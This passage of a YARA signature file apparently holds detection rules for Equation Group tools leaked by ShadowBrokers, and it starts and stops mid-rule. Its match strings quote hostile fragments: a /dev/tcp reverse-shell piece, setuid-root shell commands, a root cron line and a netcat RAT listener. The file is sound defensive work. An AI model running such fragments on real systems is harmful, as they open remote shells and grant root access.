on target:\" ascii\n      $x3 = \"cp /var/log/audit/audit.log .tmp\" ascii\n      $l1 = \"Here is the first good cron session from\" fullword ascii\n      $l2 = \"No need to clean LOGIN lines.\" fullword ascii\n   condition: \n      ( filesize < 300KB and 1 of them )\n}\n\nrule EquationGroup_reverse_shell_RID3236 : APT DEMO G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826\"\n      tags = \"APT, DEMO, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sh >/dev/tcp/\" ascii\n      $s2 = \" <&1 2>&1\" fullword ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}\n\nrule EquationGroup_tnmunger_RID3033 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file tnmunger\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TEST: mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n      $s2 = \"mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 10KB and 1 of them )\n}\n\nrule EquationGroup_ys_ratload_RID30F5 : APT DEMO FILE G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75\"\n      tags = \"APT, DEMO, FILE, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\\\"\" fullword ascii\n      $x2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $x3 = \"CALLBACK_PORT=32177\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them )\n}\n\nrule EquationGroup_eh_1_1_0_RID2F3F : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:49:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s -e -v -i target IP [-c Cert File] [-k Key File]\" fullword ascii\n      $x2 = \"TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=\" ascii\n      $x3 = \"[-l Log File] [-m save MAC time file(s)] [-p Server Port]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_evolvingstrategy_1_0_1_RID354F : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:07:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fe70e16715992cc86bbef3e71240f55c7d73815b4247d7e866c845b970233c1b\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"chown root sh; chmod 4777 sh;\" fullword ascii\n      $s2 = \"cp /bin/sh .;chown root sh;\" fullword ascii\n      $l1 = \"echo clean up when elevated:\" fullword ascii\n      $x1 = \"EXE=$DIR/sbin/ey_vrupdate\" fullword ascii\n   condition: \n      ( filesize < 4KB and 1 of them )\n}\n\nrule EquationGroup_toast_v3_2_0_RID3116 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Del --- Usage: %s -l file -w wtmp -r user\" fullword ascii\n      $s5 = \"Roasting ->%s<- at ->%d:%d<-\" ascii\n      $s6 = \"rbnoil -Roasting ->\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )\n}\n\nrule EquationGroup_sshobo_RID2F51 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sshobo\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Requested forwarding of port %d but user is not root.\" fullword ascii\n      $x2 = \"internal error: we do not read, but chan_read_failed for istate\" fullword ascii\n      $x3 = \"~#  - list forwarded connections\" fullword ascii\n      $x4 = \"packet_inject_ignore: block\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 600KB and all of them )\n}\n\nrule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0_RID382D : APT DEMO FILE G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 18:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1\"\n      tags = \"APT, DEMO, FILE, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"result = self.send_command(\\\"ls -al %s\\\" % self.options.DIR)\" fullword ascii\n      $x2 = \"cmd += \\\"D=-l%s \\\" % self.options.LISTEN_PORT\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 1 of them )\n}\n\nrule EquationGroup_packrat_RID2FA9 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file packrat\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Use this on target to get your RAT:\" fullword ascii\n      $x3 = \"$ratremotename && \" fullword ascii\n      $x5 = \"$command = \\\"$nc$bindto -vv -l -p $port < ${ratremotename}\\\" ;\" fullword ascii\n   condition: \n      ( filesize < 70KB and 1 of them )\n}\n\nrule EquationGroup_telex_RID2EE5 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file telex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>\" fullword ascii\n      $x2 = \"target is not vulnerable. exiting\" fullword ascii\n      $s3 = \"Sending final buffer: evil_blocks and shellcode...\" fullword ascii\n      $s4 = \"Timeout waiting for daemon to die.  Exploit probably failed.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )\n}\n\nrule EquationGroup_calserver_RID308A : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file calserver\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"048625e9a0ca46d7fe221e262c8dd05e7a5339990ffae2fb65a9b0d705ad6099\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s <host> <port> e <contents of a local file to be executed on target>\" fullword ascii\n      $x2 = \"Writing your %s to target.\" fullword ascii\n      $x3 = \"(e)xploit, (r)ead, (m)ove and then write, (w)rite\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )\n}\n\nrule EquationGroup_porkclient_RID30FE : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file porkclient\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-c COMMAND: shell command string\" fullword ascii\n      $s2 = \"Cannot combine shell command mode with args to do socket reuse\" fullword ascii\n      $s3 = \"-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )\n}\n\nrule EquationGroup_electricslide_RID321F : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file electricslide\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Firing with the same hosts, on altername ports (target is on 8080, listener on 443)\" fullword ascii\n      $x2 = \"Recieved Unknown Command Payload: 0x%x\" fullword ascii\n      $x3 = \"Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>\" fullword ascii\n      $x4 = \"-------- Delete Key - Remove a *closed* tab\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )\n}\n\nrule EquationGroup_libXmexploit2_RID31F6 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d7ed0234d074266cb37dd6a6a60119adb7d75cc6cc3b38654c8951b643944796\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: ./exp command display_to_return_to\" fullword ascii\n      $s2 = \"sizeof shellcode = %d\" fullword ascii\n      $s3 = \"Execve failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 1 of them )\n}\n\nrule EquationGroup_wrap_telnet_RID3168 : APT DEMO FILE G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4\"\n      tags = \"APT, DEMO, FILE, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\\\"\" fullword ascii\n      $s2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $s3 = \"echo \\\"Call back port2 = ${SPORT}\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 4KB and 1 of them )\n}\n\nrule EquationGroup_elgingamble_RID313A : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elgingamble\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* * * * * root chown root %s; chmod 4755 %s; %s\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable\" fullword ascii\n      $x3 = \"[-] failed to spawn shell: %s\" fullword ascii\n      $x4 = \"-s shell           Use shell instead of %s\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule EquationGroup_cmsd_RID2E6A : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsd\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]\" fullword ascii\n      $x2 = \"error: not vulnerable\" fullword ascii\n      $s1 = \"port=%d connected! \" fullword ascii\n      $s2 = \"xxx.XXXXXX\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule EquationGroup_ebbshave_RID3003 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eb5e0053299e087c87c2d5c6f90531cc1946019c85a43a2998c7b66a6f19ca4b\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s\" fullword ascii\n      $s2 = \"./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772\" fullword ascii\n      $s3 = \"version 1 - Start with option #18 first, if it fails then try this option\" fullword ascii\n      $s4 = \"%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup_eggbasket_RID3070 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eggbasket\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"# Building Shellcode into exploit.\" fullword ascii\n      $x2 = \"%s -w /index.html -v 3.5 -t 10 -c \\\"/usr/openwin/bin/xterm -d 555.1.2.2:0&\\\"  -d 10.0.0.1 -p 80\" fullword ascii\n      $x3 = \"# STARTING EXHAUSTIVE ATTACK AGAINST \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup_jparsescan_RID30ED : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jparsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n      $s2 = \"$gotsunos = ($line =~ /program version netid     address             service         owner/ );\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them )\n}\n\nrule EquationGroup_sambal_RID2F33 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sambal\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:47:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"+ Bruteforce mode.\" fullword ascii\n      $s3 = \"+ Host is not running samba!\" fullword ascii\n      $s4 = \"+ connecting back to: [%d.%d.%d.%d:45295]\" fullword ascii\n      $s5 = \"+ Exploit failed, try -b to bruteforce.\" fullword ascii\n      $s7 = \"Usage: %s [-bBcCdfprsStv] [host]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup_pclean_v2_1_1_2_RID31EE : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:43:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"** SIGNIFICANTLY IMPROVE PROCESSING TIME\" fullword ascii\n      $s6 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )\n}\n\nrule EquationGroup_envisioncollision_RID33FA : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envisioncollision\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mysql \\\\$D --host=\\\\$H --user=\\\\$U --password=\\\\\\\"\\\\$P\\\\\\\" -e \\\\\\\"select * from \\\\$T\" fullword ascii\n      $x2 = \"Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\\\\\"sleep 500|nc\" fullword ascii\n      $s3 = \"$ua->agent(\\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\\");\" fullword ascii\n      $s4 = \"$url = $host . \\\"/admin/index.php?adsess=\\\" . $enter . \\\"&app=core&module=applications&section=hooks&do=install_hook\\\";\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule EquationGroup_cmsex_RID2EE3 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) \" fullword ascii\n      $x2 = \"-i target ip address / hostname \" fullword ascii\n      $x3 = \"Note: Choosing the correct target type is a bit of guesswork.\" fullword ascii\n      $x4 = \"Solaris rpc.cmsd remote root exploit\" fullword ascii\n      $x5 = \"If one choice fails, you may want to try another.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule EquationGroup_exze_RID2E7F : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file exze\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"shellFile\" fullword ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"zeke_remove\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_DUL_RID2DA8 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file DUL\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 10:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"?Usage: %s <shellcode> <output_file>\" fullword ascii\n      $x2 = \"Here is the decoder+(encoded-decoder)+payload\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )\n}\n\nrule EquationGroup_slugger2_RID2FEE : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file slugger2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s hostip port cmd [printer_name]\" fullword ascii\n      $x2 = \"command must be less than 61 chars\" fullword ascii\n      $s1 = \"__rw_read_waiting\" ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"__mutexkind\" ascii\n      $s4 = \"__rw_pshared\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ( $x* ) ) ) or ( all of them )\n}\n\nrule EquationGroup_ebbisland_RID3067 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbisland\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-V] -t <target_ip> -p port\" fullword ascii\n      $x2 = \"error - shellcode not as expected - unable to fix up\" fullword ascii\n      $x3 = \"WARNING - core wipe mode - this will leave a core file on target\" fullword ascii\n      $x4 = \"[-C] wipe target core file (leaves less incriminating core on failed target)\" fullword ascii\n      $x5 = \"-A <jumpAddr> (shellcode address)\" fullword ascii\n      $x6 = \"*** Insane undocumented incremental port mode!!! ***\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_jackpop_RID2FAB : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jackpop\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:07:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%x:%d  --> %x:%d %d bytes\" fullword ascii\n      $s1 = \"client: can't bind to local address, are you root?\" fullword ascii\n      $s2 = \"Unable to register port\" fullword ascii\n      $s3 = \"Could not resolve destination\" fullword ascii\n      $s4 = \"raw troubles\" fullword ascii\n   condition: \n      ( 